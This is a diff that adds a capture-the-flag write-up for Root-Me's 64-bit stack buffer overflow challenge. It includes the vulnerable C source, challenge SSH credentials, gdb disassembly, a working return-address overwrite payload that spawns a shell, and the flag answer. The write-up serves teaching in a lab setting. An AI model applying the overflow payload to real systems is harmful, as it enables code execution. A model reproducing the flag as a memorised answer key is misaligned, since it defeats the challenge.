@@ -727,6 +727,209 @@ B33r1sSoG0oD4y0urBr4iN
 ### [App - System](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
 
 ---
+     
+## ELF x64 Stack buffer overflow basic
+
+- Author: Arod
+- Date: 31 May 2015
+- Points: 20
+- Level: 2
+
+### Statement
+
+<details>
+
+<summary markdown="span">Source Code</summary>
+
+~~~c
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+ 
+/*
+gcc -o ch35 ch35.c -fno-stack-protector -no-pie -Wl,-z,relro,-z,now,-z,noexecstack
+*/
+ 
+void callMeMaybe(){
+    char *argv[] = { "/bin/bash", "-p", NULL };
+    execve(argv[0], argv, NULL);
+}
+ 
+int main(int argc, char **argv){
+ 
+    char buffer[256];
+    int len, i;
+ 
+    scanf("%s", buffer);
+    len = strlen(buffer);
+ 
+    printf("Hello %s\n", buffer);
+ 
+    return 0;
+}
+~~~
+
+</details>
+
+### Connection Details
+
+- Host: challenge03.root-me.org
+- Protocol: SSH
+- Port:2223
+- SSH access: ssh -p 2225 app-systeme-ch35@challenge03.root-me.org 
+- Username: app-systeme-ch35
+- Password: app-systeme-ch35
+
+### Resources
+
+1. [64 Bits Linux Stack Based Buffer Overflow](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%2064%20Bits%20Linux%20Stack%20Based%20Buffer%20Overflow.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution</summary>
+
+Reviewing the source code we can see the vulnerability in the buffer variable:
+
+~~~c
+    char buffer[256];
+    int len, i;
+ 
+    scanf("%s", buffer);
+    len = strlen(buffer);
+ 
+    printf("Hello %s\n", buffer);
+~~~
+
+The first 256 characters are included in the buffer but we may be able to overflow this:
+
+~~~shell
+$ ssh -p 2223 app-systeme-ch35@challenge03.root-me.org
+app-systeme-ch35@challenge03:~$ (python -c 'print(256*"a"+256*"b")') | ./ch35; 
+Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbb
+Segmentation fault
+~~~
+
+We can see the buffer overflow exists but we need to identify the stack addresses and the call to the callMeMaybe() function.  We can disassemble on the challenge server using gdb:
+
+~~~shell
+$ gdb ch35
+GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ch35...(no debugging symbols found)...done.
+(gdb) disass main
+Dump of assembler code for function main:
+   0x0000000000400628 <+0>:	push   rbp
+   0x0000000000400629 <+1>:	mov    rbp,rsp
+   0x000000000040062c <+4>:	sub    rsp,0x120
+   0x0000000000400633 <+11>:	mov    DWORD PTR [rbp-0x114],edi
+   0x0000000000400639 <+17>:	mov    QWORD PTR [rbp-0x120],rsi
+   0x0000000000400640 <+24>:	lea    rax,[rbp-0x110]
+   0x0000000000400647 <+31>:	mov    rsi,rax
+   0x000000000040064a <+34>:	lea    rdi,[rip+0xd0]        # 0x400721
+   0x0000000000400651 <+41>:	mov    eax,0x0
+   0x0000000000400656 <+46>:	call   0x4004f0 <__isoc99_scanf@plt>
+   0x000000000040065b <+51>:	lea    rax,[rbp-0x110]
+   0x0000000000400662 <+58>:	mov    rdi,rax
+   0x0000000000400665 <+61>:	call   0x4004c0 <strlen@plt>
+   0x000000000040066a <+66>:	mov    DWORD PTR [rbp-0x4],eax
+   0x000000000040066d <+69>:	lea    rax,[rbp-0x110]
+   0x0000000000400674 <+76>:	mov    rsi,rax
+   0x0000000000400677 <+79>:	lea    rdi,[rip+0xa6]        # 0x400724
+   0x000000000040067e <+86>:	mov    eax,0x0
+   0x0000000000400683 <+91>:	call   0x4004d0 <printf@plt>
+   0x0000000000400688 <+96>:	mov    eax,0x0
+   0x000000000040068d <+101>:	leave  
+   0x000000000040068e <+102>:	ret    
+End of assembler dump.
+(gdb) disass callMeMaybe
+Dump of assembler code for function callMeMaybe:
+   0x00000000004005e7 <+0>:	push   rbp
+   0x00000000004005e8 <+1>:	mov    rbp,rsp
+   0x00000000004005eb <+4>:	sub    rsp,0x20
+   0x00000000004005ef <+8>:	lea    rax,[rip+0x11e]        # 0x400714
+   0x00000000004005f6 <+15>:	mov    QWORD PTR [rbp-0x20],rax
+   0x00000000004005fa <+19>:	lea    rax,[rip+0x11d]        # 0x40071e
+   0x0000000000400601 <+26>:	mov    QWORD PTR [rbp-0x18],rax
+   0x0000000000400605 <+30>:	mov    QWORD PTR [rbp-0x10],0x0
+   0x000000000040060d <+38>:	mov    rax,QWORD PTR [rbp-0x20]
+   0x0000000000400611 <+42>:	lea    rcx,[rbp-0x20]
+   0x0000000000400615 <+46>:	mov    edx,0x0
+   0x000000000040061a <+51>:	mov    rsi,rcx
+   0x000000000040061d <+54>:	mov    rdi,rax
+   0x0000000000400620 <+57>:	call   0x4004e0 <execve@plt>
+   0x0000000000400625 <+62>:	nop
+   0x0000000000400626 <+63>:	leave  
+   0x0000000000400627 <+64>:	ret    
+End of assembler dump.
+~~~
+
+The disassembly of main shows the memory allocation for the buffer occurs at $RBP-0x110, and the len variable is stored at $RBP-0x04:
+
+~~~
+   0x000000000040065b <+51>:	lea    rax,[rbp-0x110]
+   0x0000000000400662 <+58>:	mov    rdi,rax
+   0x0000000000400665 <+61>:	call   0x4004c0 <strlen@plt>
+   0x000000000040066a <+66>:	mov    DWORD PTR [rbp-0x4],eax
+~~~
+
+The stack will appear:
+
+|--------|------|------------|
+| Buffer | 268B | $RBP-0x110 |
+| Len    | 4B   | $RBP-0x04  |
+| $RBP   | 8B   | $RBP       |
+|--------|------|------------|
+
+The address of the callMeMaybe() function is 0x4005e7, in little-endian (8B) will be: 0xe7 0x05 0x40 0x00 0x00 0x00 0x00 0x00.  We can append this to a string of length 268+4+8B:
+
+~~~shell
+app-systeme-ch35@challenge03:~$ (python -c 'print(268*"a"+4*"b"+8*"c"+"\xe7\x05\x40\x00\x00\x00\x00\x00")'; cat) | ./ch35
+Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+ls -a
+.  ..  ._perms	.git  .passwd  ch35  ch35.c
+cat .passwd 
+B4sicBufferOverflowExploitation
+
+exit
+app-systeme-ch35@challenge03:~$ 
+~~~
+  
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+B4sicBufferOverflowExploitation
+~~~
+
+</details>
+
+---
+
+### [App - System](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
 
 Last updated April 2022.
 
